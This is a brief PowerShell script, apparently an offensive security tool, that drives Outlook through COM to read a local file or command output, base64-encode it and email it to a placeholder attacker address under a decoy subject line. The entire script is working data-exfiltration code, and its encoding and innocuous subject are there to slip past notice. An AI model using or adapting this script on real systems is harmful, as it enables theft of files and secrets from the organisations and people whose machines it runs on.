# ExfilEmail.ps1 by @xer0dayz - https://xerosecurity.com
#
# This script will exfil the entire contents of a file or given command via base64 encoded strings using email to a custom email address.
#

$Outlook = New-Object -ComObject Outlook.Application
$Mail = $Outlook.CreateItem(0)
$Mail.To = "ATTACKER_EMAIL@mailinator.com"
$Mail.Subject = "Nothing to see here... "
#$content = Invoke-Command {Get-Process}
$content = Get-Content exfil.txt

#Base64 Encoder
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($content)
$EncodedText =[Convert]::ToBase64String($Bytes)
#$EncodedText

$Mail.Body = $EncodedText
#attachments
$file = "C:\Temp\exfil.txt"
#$Mail.Attachments.Add($file);
#send message
$Mail.Send()
#quit and cleanup
#$Outlook.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null